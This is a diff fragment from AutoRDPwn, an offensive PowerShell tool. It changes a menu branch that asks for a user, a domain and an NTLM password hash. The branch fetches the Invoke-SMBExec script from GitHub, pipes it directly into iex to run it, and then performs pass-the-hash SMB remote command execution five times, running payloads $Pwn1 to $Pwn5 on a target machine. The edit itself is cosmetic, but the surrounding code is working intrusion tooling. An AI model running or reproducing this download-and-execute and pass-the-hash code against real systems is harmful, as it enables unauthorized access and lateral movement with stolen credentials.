@@ -251,15 +251,15 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
-        $domain = $Host.UI.ReadLine()
+        $domain = $Host.UI.ReadLine() ; if(!$domain) { $computer = 'localhost' ; Write-Host "localhost" }
         Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
         $hash = $Host.UI.ReadLine()
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1"
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2"
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3"
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4"
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5" }
 
 	'3' {
